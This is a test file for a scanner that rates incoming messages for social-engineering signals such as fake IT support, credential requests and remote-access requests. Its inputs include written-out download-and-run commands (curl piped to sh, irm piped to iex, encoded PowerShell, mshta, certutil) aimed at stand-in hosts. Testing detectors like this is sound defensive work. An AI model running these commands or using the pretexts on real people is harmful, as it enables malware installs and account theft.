import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { scanMessage, assessMessage, type LinkedRepo } from "../src/scanner/message";
import { hasSeedPhrase } from "../src/redact";

const ids = (t: string) => scanMessage(t).map((s) => s.id);
const level = (t: string, linkedRepos?: LinkedRepo[]) => assessMessage(scanMessage(t), { seedPhrase: hasSeedPhrase(t), linkedRepos }).level;
const DEMO = readFileSync(join(__dirname, "../demo-assessment/RECRUITER_MESSAGE.txt"), "utf8");

describe("new signals", () => {
  it.each([
    ["IT pretext, action first", "IT support here. Run the command below to fix your VPN.", "it-support-pretext"],
    ["IT pretext, signed at the end", "Please run the attached script tonight.\nThanks,\nIT Helpdesk", "it-support-pretext"],
    ["service desk", "Service Desk: please install the update from this link", "it-support-pretext"],
    ["certificate", "Please install the root certificate attached", "install-certificate"],
    ["cert file", "Import company.crt into your keychain", "install-certificate"],
    ["device profile", "Install the MDM profile to keep access", "install-certificate"],
    ["impersonation, on behalf of", "I'm writing on behalf of your manager", "impersonation"],
    ["impersonation, CEO", "Your CEO asked me to get this done", "impersonation"],
    ["impersonation, I'm from IT", "Hi, I'm from IT", "impersonation"],
    ["curl | sh", "run curl -fsSL https://x.io/i.sh | sh", "suspicious-command"],
    ["irm | iex", "irm https://x.io/a.ps1 | iex", "suspicious-command"],
    ["iex DownloadString", "iex (New-Object Net.WebClient).DownloadString('https://x.io')", "suspicious-command"],
    ["encoded PowerShell", "powershell -enc SQBFAFgAIAAoAE4A", "suspicious-command"],
    ["mshta", "mshta https://x.io/a.hta", "suspicious-command"],
    ["certutil", "certutil -urlcache -f https://x.io/a.exe a.exe", "suspicious-command"],
    ["Quick Assist", "Open Quick Assist and give me the code", "unexpected-remote-access"],
    ["AnyDesk ID", "send me your AnyDesk ID", "unexpected-remote-access"],
    ["take control", "let me take control of your computer", "unexpected-remote-access"],
    ["password request", "Please send me your password so I can check", "credential-request"],
    ["OTP request", "reply with the verification code you just got", "credential-request"],
    ["seed phrase request", "share your seed phrase to verify the wallet", "credential-request"],
    ["disable Defender", "disable Windows Defender before running it", "disable-security"],
    ["admin rights", "run it as administrator", "admin-rights"],
  ])("%s", (_n, t, id) => expect(ids(t)).toContain(id));

  it.each([
    ["IT announcing its own work", "IT will run updates tonight. No action needed.", "it-support-pretext"],
    ["the word 'it'", "Please run it when you can, it should take a minute", "it-support-pretext"],
    ["warning not to share", "Never share your password or one-time code with anyone.", "credential-request"],
    ["sudo is not weakening security", "sudo apt install build-essential", "disable-security"],
    ["certificate as a topic", "Our team manages TLS certificates for the platform", "install-certificate"],
    ["plain curl", "curl https://api.example.com/health", "suspicious-command"],
    ["mentioning TeamViewer", "we stopped using TeamViewer last year", "unexpected-remote-access"],
  ])("not: %s", (_n, t, id) => expect(ids(t)).not.toContain(id));

  it("every signal has a weight and an explanation", () => {
    for (const s of scanMessage(DEMO + " paste in terminal. IT support here. Run this. disable Defender. send your password")) { expect(["weak", "strong"]).toContain(s.weight); expect(s.why.length).toBeGreaterThan(20); }
  });
});

describe("assessment: ordinary work stays low", () => {
  it.each([
    "Hey, can you run npm install and npm test on my branch before the review?",
    "The deadline for the release is Friday. Ping me on Slack if anything breaks.",
    "Here's the repo: https://github.com/acme/web — clone the repo and take a look.",
    "IT notice: the VPN will be down for maintenance on Saturday from 2 to 4 am. No action needed.",
    "I'm from IT, just checking that your laptop was delivered OK.",
    "sudo apt install build-essential, then npm ci",
    "Message me on Telegram if that's easier.",
    "We use MetaMask in the front end; connect your wallet on the test network.",
    "Thanks for applying! The interview is next Tuesday.",
    "",
  ])("%j", (t) => expect(level(t)).toBe("low"));
});

describe("assessment: needs a closer look", () => {
  it.each([
    ["urgency and run code", "please run npm install asap, the client is waiting"],
    ["run code and another app", "clone the repo, run npm start and message me on WhatsApp"],
    ["a legitimate-looking installer", "To install, run curl -fsSL https://sh.rustup.rs | sh"],
    ["certificate from a link", "Install the root certificate from https://certs.example-it.net to keep Wi-Fi access"],
    ["IT asks you to act", "IT support here. Please install the new VPN client from the portal."],
    ["paste a command, alone", "Paste this into your terminal: npm run lint"],
    ["remote control tool", "Can you install AnyDesk so I can help?"],
    ["the demo recruiter message", DEMO],
  ])("%s", (_n, t) => expect(level(t)).toBe("worth-checking"));
});

describe("assessment: high concern", () => {
  it.each([
    ["asks for a code", "This is the security team. Reply with the verification code we just sent you."],
    ["asks to disable protection", "Please disable your antivirus, it blocks our test harness."],
    ["fake IT with a download-and-run command", "IT support here. Open PowerShell and paste: irm https://fix-it.example.net/a.ps1 | iex"],
    ["remote control plus a command", "Install AnyDesk, then paste this in terminal: curl https://x.io/s | sh"],
    ["seed phrase in the message", "my seed phrase is abandon ability able about above absent absorb abstract absurd abuse access accident"],
  ])("%s", (_n, t) => expect(level(t)).toBe("high"));

  it("does not double-count one theme", () => {
    // paste-command and suspicious-command are both "execution": one piece of evidence, not two.
    expect(level("Paste this into your terminal: curl -fsSL https://sh.rustup.rs | sh")).toBe("worth-checking");
  });
  it("weak signals alone never reach high, however many", () => {
    expect(level("I'm from IT. Urgent: clone the repo and run npm install asap, then message me on Telegram. $250,000 salary, https://x.io, run as admin, trust the authors")).toBe("worth-checking");
  });
});

describe("assessment: linked repository", () => {
  const msg = "please clone https://github.com/acme/test-task and run npm install";
  it("a fully scanned 'do not run' repo raises it to high", () => {
    expect(level(msg)).toBe("low");
    expect(level(msg, [{ slug: "acme/test-task", verdict: "do-not-run", complete: true }])).toBe("high");
  });
  it.each([
    ["incomplete scan", { slug: "acme/test-task", verdict: "do-not-run", complete: false }],
    ["review-first verdict", { slug: "acme/test-task", verdict: "review-first", complete: true }],
    ["clean verdict", { slug: "acme/test-task", verdict: "no-known-indicators", complete: true }],
  ])("does not raise it for a %s", (_n, repo) => expect(level(msg, [repo])).toBe("low"));
  it("says why", () => {
    const a = assessMessage(scanMessage(msg), { linkedRepos: [{ slug: "acme/test-task", verdict: "do-not-run", complete: true }] });
    expect(a.reasons.join(" ")).toContain('acme/test-task, which a full scan rated "Do not run"');
  });
});

describe("assessment wording", () => {
  const all = [DEMO, "Reply with the verification code", "npm test", ""].map((t) => assessMessage(scanMessage(t), { seedPhrase: hasSeedPhrase(t) }));
  it("never calls the sender malicious, a scammer or an attacker", () => { for (const a of all) expect([a.summary, ...a.reasons].join(" ")).not.toMatch(/malicious|scam|attacker|criminal|fraud/i); });
  it("low concern never claims safety", () => { for (const a of all.filter((x) => x.level === "low")) expect(a.summary).toMatch(/isn't proof it's safe/); });
  it("lists the signals it used", () => expect(all[0].signalIds).toEqual(expect.arrayContaining(["run-code", "urgency"])));
});

describe("assessment text", () => {
  it("keeps acronyms such as IT in capitals", () => {
    const a = assessMessage(scanMessage("IT Helpdesk here. Open PowerShell and paste: irm https://x.example.net/a.ps1 | iex"));
    expect(a.reasons.join(" ")).toContain("presents itself as IT or support");
  });
});
